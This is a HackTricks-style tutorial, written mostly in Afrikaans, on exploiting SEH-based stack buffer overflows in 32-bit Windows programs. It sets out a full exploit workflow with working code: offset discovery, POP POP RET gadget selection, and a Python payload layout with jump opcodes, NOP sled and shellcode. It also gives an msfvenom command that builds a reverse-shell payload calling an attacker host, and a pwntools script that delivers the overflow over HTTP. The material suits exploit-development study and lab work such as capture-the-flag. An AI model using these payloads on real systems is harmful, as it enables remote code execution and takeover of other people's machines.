# Windows SEH-based Stack Overflow Exploitation (nSEH/SEH)

{{#include ../../banners/hacktricks-training.md}}

SEH-based eksploitasie is 'n klassieke x86 Windows-tegniek wat die Structured Exception Handler-ketting op die stapel misbruik. Wanneer 'n stapel-bufferoorloop die twee 4-byte velde oorskryf

- nSEH: pointer to the next SEH record, and
- SEH: pointer to the exception handler function

kan 'n aanvaller die uitvoering oorneem deur:

1) SEH op die adres van 'n POP POP RET gadget in 'n nie-beskermde module te stel, sodat wanneer 'n exception verwerk word die gadget terugkeer na bytes onder die aanvaller se beheer, en
2) nSEH te gebruik om die uitvoering te herlei (tipies 'n kort spring) terug na die groot oorstroomde buffer waar shellcode lê.

Hierdie tegniek is spesifiek vir 32-bit prosesse (x86). Op moderne stelsels, verkies 'n module sonder SafeSEH en ASLR vir die gadget. Slegte karakters sluit dikwels 0x00, 0x0a, 0x0d (NUL/CR/LF) in weens C-strings en HTTP parsing.

---

## Vind presiese offsets (nSEH / SEH)

- Laat die proses crash en verifieer dat die SEH-ketting oor geskryf is (bv., in x32dbg/x64dbg, kyk die SEH view).
- Stuur 'n cyclic pattern as die oorvloeiende data en bereken die offsets van die twee dwords wat in nSEH en SEH beland.

Voorbeeld met peda/GEF/pwntools op 'n 1000-byte POST body:
```bash
# generate pattern (any tool is fine)
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
# or
python3 -c "from pwn import *; print(cyclic(1000).decode())"

# after crash, note the two 32-bit values from SEH view and compute offsets
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 0x32424163   # nSEH
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 0x41484241   # SEH
# ➜ offsets example: nSEH=660, SEH=664
```
Valideer deur merkers op daardie posisies te plaas (bv., nSEH=b"BB", SEH=b"CC"). Hou totale lengte konstant om die crash reproduseerbaar te maak.

---

## Kies 'n POP POP RET (SEH gadget)

Jy benodig 'n POP POP RET-sekwensie om die SEH-raamwerk af te rol en terug te keer na jou nSEH-bytes. Vind dit in 'n module sonder SafeSEH en by voorkeur sonder ASLR:

- Mona (Immunity/WinDbg): `!mona modules` dan `!mona seh -m modulename`.
- x64dbg plugin ERC.Xdbg: `ERC --SEH` om POP POP RET gadgets en SafeSEH-status te lys.

Kies 'n adres wat geen badchars bevat wanneer dit little-endian geskryf word nie (bv., `p32(0x004094D8)`). Gee voorkeur aan gadgets binne die kwesbare binary as beskermings dit toelaat.

---

## Jump-back tegniek (short + near jmp)

nSEH is slegs 4 bytes, wat hoogstens 'n 2-byte short jump (`EB xx`) plus padding kan huisves. As jy honderde bytes terug moet spring om jou buffer-begin te bereik, gebruik 'n 5-byte near jump wat net voor nSEH geplaas is en koppel dit met 'n short jump vanaf nSEH.

Met nasmshell:
```text
nasm> jmp -660           ; too far for short; near jmp is 5 bytes
E967FDFFFF
nasm> jmp short -8       ; 2-byte short jmp fits in nSEH (with 2 bytes padding)
EBF6
nasm> jmp -652           ; 8 bytes closer (to account for short-jmp hop)
E96FFDFFFF
```
Uitleg-idee vir 'n 1000-byte payload met nSEH op offset 660:
```python
buffer_length = 1000
payload  = b"\x90"*50 + shellcode                    # NOP sled + shellcode at buffer start
payload += b"A" * (660 - 8 - len(payload))           # pad so we are 8 bytes before nSEH
payload += b"\xE9\x6F\xFD\xFF\xFF" + b"EEE"     # near jmp -652 (5B) + 3B padding
payload += b"\xEB\xF6" + b"BB"                      # nSEH: short jmp -8 + 2B pad
payload += p32(0x004094D8)                           # SEH: POP POP RET (no badchars)
payload += b"D" * (buffer_length - len(payload))
```
Execution flow:
- Exception gebeur, dispatcher gebruik die oor-geskryfde SEH.
- POP POP RET ontvou na ons nSEH.
- nSEH voer `jmp short -8` uit na die 5-byte near jump.
- Die near jump land by die begin van ons buffer waar die NOP sled + shellcode lê.

---

## Slegte karakters

Bou 'n volledige badchar string en vergelyk die stack memory na die crash, en verwyder bytes wat deur die teiken-parser gemanipuleer word. Vir HTTP-based overflows, `\x00\x0a\x0d` word byna altyd uitgesluit.
```python
badchars = bytes([x for x in range(1,256)])
payload  = b"A"*660 + b"BBBB" + b"CCCC" + badchars  # position appropriately for your case
```
---

## Shellcode generation (x86)

Gebruik msfvenom met jou badchars. 'n klein NOP sled help om landingsvariasie te verdra.
```bash
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> \
-b "\x00\x0a\x0d" -f python -v sc
```
As dit on-the-fly gegenereer word, is die hex-formaat gerieflik om in Python te embed en te unhex:
```bash
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> \
-b "\x00\x0a\x0d" -f hex
```
---

## Aflewering oor HTTP (presiese CRLF + Content-Length)

Wanneer die kwesbare vektor 'n HTTP request body is, skep 'n raw request met presiese CRLFs en Content-Length sodat die server die hele oorvloeiende body lees.
```python
# pip install pwntools
from pwn import remote
host, port = "<TARGET_IP>", 8080
body = b"A" * 1000  # replace with the SEH-aware buffer above
req = f"""POST / HTTP/1.1
Host: {host}:{port}
User-Agent: curl/8.5.0
Accept: */*
Content-Length: {len(body)}
Connection: close

""".replace('\n','\r\n').encode() + body
p = remote(host, port)
p.send(req)
print(p.recvall(timeout=0.5))
p.close()
```
---

## Gereedskap

- x32dbg/x64dbg om die SEH-ketting te bekyk en die crash te triageer.
- ERC.Xdbg (x64dbg plugin) om SEH-gadgets te enumereer: `ERC --SEH`.
- Mona as 'n alternatief: `!mona modules`, `!mona seh`.
- nasmshell om kort/na-bye spronge te assembleer en rou opkodes te kopieer.
- pwntools om presiese netwerk-payloads te skep.

---

## Notas en voorbehoude

- Slegs van toepassing op x86-prosesse. x64 gebruik 'n ander SEH-skema en SEH-gebaseerde uitbuiting is oor die algemeen nie haalbaar nie.
- Voorkeur vir gadgets in modules sonder SafeSEH en ASLR; anders, vind 'n onbeveiligde module wat in die proses gelaai is.
- Diens-watchdogs wat outomaties na 'n crash herbegin, kan iteratiewe exploit-ontwikkeling vergemaklik.

## Verwysings
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf)](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [ERC.Xdbg – Exploit Research Plugin for x64dbg (SEH search)](https://github.com/Andy53/ERC.Xdbg)
- [Corelan – Exploit writing tutorial part 7 (SEH)](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-7-unicode-0day-buffer-overflow-seh-and-venetian-shellcode/)
- [Mona.py – WinDbg/Immunity helper](https://github.com/corelan/mona)

{{#include ../../banners/hacktricks-training.md}}
